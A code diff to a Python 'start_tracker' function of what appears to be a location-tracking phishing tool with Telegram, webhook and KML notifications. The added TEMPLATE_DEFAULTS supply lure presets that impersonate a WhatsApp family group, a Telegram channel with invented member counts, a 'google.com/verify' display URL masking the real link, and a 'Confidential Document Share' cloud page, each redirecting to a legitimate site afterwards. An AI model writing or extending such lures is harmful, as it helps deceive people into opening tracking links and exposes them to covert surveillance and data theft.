@@ -203,7 +203,7 @@ def start_tracker(config_dict=None):
     env['TEMPLATE'] = str(template_id)
     env['DEBUG_HTTP'] = '1' if cfg.get('debug_http', True) else '0'
 
-    # Optional notifications & parameters
+    # Optional notifications & parameters from config
     param_keys = [
         'TELEGRAM', 'WEBHOOK', 'KML',
         'REDIRECT', 'TITLE', 'IMAGE', 'DESC',
@@ -214,6 +214,29 @@ def start_tracker(config_dict=None):
         val = cfg.get(lower_key) or cfg.get(key)
         if val is not None and str(val).strip():
             env[key] = str(val).strip()
+
+    TEMPLATE_DEFAULTS = {
+        0: {},
+        1: {"REDIRECT": "https://drive.google.com"},
+        2: {"TITLE": "My Family & Friends", "IMAGE": "template/whatsapp/images/ZIvBTrQd9nP.png"},
+        3: {"TITLE": "Project Updates", "IMAGE": "template/whatsapp/images/ZIvBTrQd9nP.png", "REDIRECT": "https://chat.whatsapp.com"},
+        4: {"TITLE": "News & Signals Channel", "IMAGE": "template/telegram/images/Arrow_1x.png", "DESC": "Official Group for Updates", "MEM_NUM": "1,420", "ONLINE_NUM": "84"},
+        5: {"TITLE": "Conference Meeting Topic"},
+        6: {"REDIRECT": "https://google.com", "DISPLAY_URL": "https://google.com/verify"},
+        7: {
+            "SITENAME": "Cloud Storage",
+            "TITLE": "Confidential Document Share",
+            "DESC": "Click to view the attached file.",
+            "IMAGE": "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600",
+            "REDIRECT": "https://google.com"
+        }
+    }
+
+    # Apply template defaults for any missing/empty parameter
+    defaults = TEMPLATE_DEFAULTS.get(template_id, {})
+    for k, default_val in defaults.items():
+        if k not in env or not str(env[k]).strip():
+            env[k] = default_val
 
     # Save active config
     cfg['started_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
